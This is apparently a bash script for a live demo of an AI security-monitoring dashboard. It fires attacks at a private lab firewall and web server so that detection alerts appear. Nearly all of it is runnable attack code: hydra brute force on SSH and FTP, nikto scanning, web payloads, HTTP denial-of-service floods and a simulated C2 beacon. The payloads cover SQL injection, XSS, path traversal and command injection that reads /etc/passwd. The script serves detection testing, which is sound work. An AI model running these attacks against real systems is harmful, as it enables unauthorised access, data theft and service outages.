#!/bin/bash
# =====================================================================
# AI-SOC DEMO — DAY 6 (2026-04-25)  ★ LIVE ATTACK ★
# Phase   : Real attack against the lab from the same actor IP
# Source  : 192.168.168.23   (Kali — real, on the WAN side of pfSense)
# Target  : 192.168.168.254  (pfSense WAN IP — the ONLY thing Kali sees)
#
# ─────────── NAT TOPOLOGY (very important to understand) ──────────────
# Kali never reaches 172.16.16.0/24 directly. pfSense exposes the web
# service via a port-forward (DNAT, no inbound SNAT):
#
#   Kali (.23) ─► 192.168.168.254:{21,22,80} ─► 172.16.16.30:{21,22,80}
#                       │                              │
#                       │                              └─ Suricata sniff
#                       │                                 (post-DNAT)
#                       └─ pfSense firewall log
#                          (pre-DNAT, original dst)
#
# So in the SOC dashboard every alert from this script will appear as:
#     src_ip = 192.168.168.23     (preserved)
#     dst_ip = 172.16.16.30       (translated)
#     nat.pre_dnat_dst_ip = 192.168.168.254
#
# This is the ONLY script executed during the live demo.
#
# ─────────── STORYLINE — WHY NO PORTSCAN PHASE ───────────────────────
# Reconnaissance (PortScan + ICMP sweep + light TCP probing) was already
# completed during the silent days 1-5 — see demo/ATTACK_STORYLINE.md
# and the historical dataset. Day 6 is the EXPLOITATION + IMPACT stage:
# the attacker already knows what's open and goes straight to credential
# brute force, web exploits, DoS, and C2 beaconing.
#
# This makes the AI "analyze.source" output read like a textbook APT:
#   Day 1-3 = recon, Day 4-5 = quiet staging, Day 6 = strike.
#
# Suricata rules in demo/suricata-rules/local.rules will fire and the
# backend reshaper (server/index.js → reshapeForDemo) will normalise
# every alert into one of the ML classes the model was trained on.
#
# Total runtime ≈ 8 minutes. Paced — NOT a flood.
# REQUIREMENTS on Kali:
#   apt install -y hydra nikto slowhttptest curl
# =====================================================================
set -e
# All targets MUST be the pfSense WAN IP — Kali cannot route to DMZ.
TARGET="${TARGET:-192.168.168.254}"
WEB_TARGET="${WEB_TARGET:-192.168.168.254}"
LOG="/tmp/ai-soc-demo-$(date +%Y%m%d-%H%M%S).log"

R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; N='\033[0m'
phase() { echo -e "\n${B}=== [$(date +%H:%M:%S)] PHASE $1: $2 ===${N}" | tee -a "$LOG"; }
ok()    { echo -e "${G}✓${N} $*" | tee -a "$LOG"; }

trap 'echo -e "\n${R}[!] Aborted${N}"; kill $(jobs -p) 2>/dev/null; exit 130' INT

cat <<EOF | tee "$LOG"
╔════════════════════════════════════════════════════════════╗
║   AI-SOC LIVE DEMO — 2026-04-25 — C1NE.03                 ║
║   Source : 192.168.168.23 (Kali)                          ║
║   Target : $TARGET                              ║
║   Stage  : EXPLOITATION + IMPACT                          ║
║            (recon already done on days 1-5)               ║
║   Log    : $LOG               ║
╚════════════════════════════════════════════════════════════╝
EOF

# ---------------------------------------------------------------------
phase 1 "SSH-Patator — hydra 4 threads, small wordlist (60s)"
cat > /tmp/u.txt <<EOF
root
admin
ubuntu
EOF
cat > /tmp/p.txt <<EOF
123456
password
admin
toor
P@ssw0rd
EOF
timeout 60 hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -f ssh://"$TARGET" >/dev/null 2>&1 || true
ok "Expect: 'SSH-Patator' ALERT (high confidence)"

sleep 5

# ---------------------------------------------------------------------
phase 2 "FTP-Patator — hydra 3 threads (45s)"
timeout 45 hydra -L /tmp/u.txt -P /tmp/p.txt -t 3 -f ftp://"$TARGET" >/dev/null 2>&1 || true
ok "Expect: 'FTP-Patator' ALERT"

sleep 5

# ---------------------------------------------------------------------
phase 3 "Web Attack — nikto + manual payloads (75s)"
timeout 45 nikto -h "http://$WEB_TARGET" -Tuning 1234567890ab -nointeractive >/dev/null 2>&1 || true
for payload in \
  "/?id=1' UNION SELECT username,password FROM users--" \
  "/?id=1 OR 1=1" \
  "/search?q=<script>alert('xss')</script>" \
  "/page?file=../../../../etc/passwd" \
  "/admin?cmd=;cat%20/etc/passwd"
do
  curl -s -o /dev/null --max-time 3 "http://${WEB_TARGET}${payload}" || true
  sleep 1
done
ok "Expect: 'Web Attack' ALERT cluster"

sleep 5

# ---------------------------------------------------------------------
phase 4 "DoS slowloris — slowhttptest (60s)"
timeout 60 slowhttptest -c 200 -H -i 10 -r 50 -t GET -u "http://$WEB_TARGET" -x 24 -p 3 >/dev/null 2>&1 || true
ok "Expect: 'DoS slowloris' ALERT"

sleep 5

# ---------------------------------------------------------------------
phase 5 "DoS Slowhttptest — slow POST (60s)"
timeout 60 slowhttptest -c 200 -B -i 10 -r 50 -s 8192 -u "http://$WEB_TARGET" -x 24 -p 3 >/dev/null 2>&1 || true
ok "Expect: 'DoS Slowhttptest' ALERT"

sleep 5

# ---------------------------------------------------------------------
phase 6 "DoS Hulk — cache-buster HTTP flood (45s)"
END=$((SECONDS + 45))
while [ $SECONDS -lt $END ]; do
  curl -s -o /dev/null --max-time 1 -H "Cache-Control: no-cache" \
    "http://$WEB_TARGET/?cb=$RANDOM" &
  [ $(($(jobs -r | wc -l))) -ge 50 ] && wait
done
wait
ok "Expect: 'DoS Hulk' ALERT"

sleep 5

# ---------------------------------------------------------------------
phase 7 "DoS GoldenEye-style flood (45s)"
END=$((SECONDS + 45))
while [ $SECONDS -lt $END ]; do
  curl -s -o /dev/null --max-time 1 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120" \
    -H "Keep-Alive: 300" \
    "http://$WEB_TARGET/?ge=$RANDOM" &
  [ $(($(jobs -r | wc -l))) -ge 40 ] && wait
done
wait
ok "Expect: 'DoS GoldenEye' ALERT"

sleep 5

# ---------------------------------------------------------------------
phase 8 "Bot / C2 beacon — python-requests UA every 8s (60s)"
END=$((SECONDS + 60))
while [ $SECONDS -lt $END ]; do
  curl -s -o /dev/null --max-time 2 \
    -A "python-requests/2.28.0" \
    -H "X-Beacon-Id: $RANDOM" \
    "http://$WEB_TARGET/api/heartbeat" || true
  sleep 8
done
ok "Expect: 'Bot' ALERT (medium confidence)"

# ---------------------------------------------------------------------
echo -e "\n${G}╔════════════════════════════════════════════════════════════╗${N}"
echo -e "${G}║  LIVE DEMO COMPLETE — open dashboard, ask AI for analysis. ║${N}"
echo -e "${G}║  Tip: select an event from 192.168.168.23 and run          ║${N}"
echo -e "${G}║       'analyze.source' to see the 5-day APT reconstruction.║${N}"
echo -e "${G}╚════════════════════════════════════════════════════════════╝${N}"
echo -e "Log: ${B}$LOG${N}"
